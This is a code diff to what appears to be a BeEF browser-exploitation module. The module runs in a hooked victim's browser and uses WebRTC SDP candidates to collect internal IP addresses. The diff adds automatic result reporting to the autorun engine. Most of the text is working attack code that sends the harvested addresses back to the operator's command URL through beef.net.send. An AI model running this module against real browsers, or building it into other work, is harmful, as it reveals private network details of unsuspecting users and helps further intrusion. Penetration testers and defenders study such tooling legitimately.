@@ -8,7 +8,7 @@ beef.execute(function() {
 
    var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
 
-	if (RTCPeerConnection) (function () {
+	if (RTCPeerConnection){
 
 	    var addrs = Object.create(null);
 	    addrs["0.0.0.0"] = false;
@@ -24,6 +24,7 @@ beef.execute(function() {
 	      if (evt.candidate){
 	        beef.debug("a="+evt.candidate.candidate);
 	        grepSDP("a="+evt.candidate.candidate);
+			retResults();
 	      }
 	    };
 
@@ -31,10 +32,18 @@ beef.execute(function() {
 	    rtc.createOffer(function (offerDesc) {
 	        grepSDP(offerDesc.sdp);
 	        rtc.setLocalDescription(offerDesc);
+			retResults();
 	    }, function (e) {
 	        beef.debug("SDP Offer Failed");
-	        beef.net.send('<%= @command_url %>', <%= @command_id %>, "SDP Offer Failed");
-            });
+	        beef.net.send('<%= @command_url %>', <%= @command_id %>, "SDP Offer Failed", beef.are.status_error());
+        });
+
+		function retResults(){
+			var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
+
+			// This is for the ARE, as this module is async, so we can't just return as we would in a normal sync way
+			get_internal_ip_webrtc_mod_output = [beef.are.status_success(), displayAddrs.join(",")];
+		}
 
 	    // Return results
 	    function processIPs(newAddr) {
@@ -42,8 +51,9 @@ beef.execute(function() {
 	        else addrs[newAddr] = true;
 	        var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
 	        beef.debug("Found IPs: "+ displayAddrs.join(","));
-	        beef.net.send('<%= @command_url %>', <%= @command_id %>, "IP is " + displayAddrs.join(","));
+	        beef.net.send('<%= @command_url %>', <%= @command_id %>, "IP is " + displayAddrs.join(","), beef.are.status_success());
 	    }
+
 
 	    // Retrieve IP addresses from SDP 
 	    function grepSDP(sdp) {
@@ -61,8 +71,7 @@ beef.execute(function() {
 	            }
 	        });
 	    }
-	})(); else {
-		beef.net.send('<%= @command_url %>', <%= @command_id %>, "Browser doesn't appear to support RTCPeerConnection");
-	} 
-
+	}else {
+		beef.net.send('<%= @command_url %>', <%= @command_id %>, "Browser doesn't appear to support RTCPeerConnection", beef.are.status_error());
+	}
 });
